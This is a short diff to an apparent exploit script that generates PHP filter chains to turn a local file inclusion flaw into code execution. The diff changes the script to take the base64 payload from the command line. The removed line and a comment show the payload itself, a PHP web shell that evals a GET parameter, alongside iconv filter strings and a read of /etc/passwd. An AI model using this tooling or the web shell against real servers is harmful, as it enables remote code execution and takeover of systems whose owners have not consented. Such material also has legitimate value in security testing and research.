@@ -1,8 +1,14 @@
+import sys
+
+if len(sys.argv)<2:
+        print(f'python3 ./{sys.argv[0]} <base64_code>')
+        exit()
+
 # https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
 file_to_use = "/etc/passwd"
 
 #<?php eval($_GET[1]);?>a
-base64_payload = "PD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5h"
+base64_payload = sys.argv[1]
 
 # generate some garbage base64
 filters = "convert.iconv.UTF8.CSISO2022KR|"
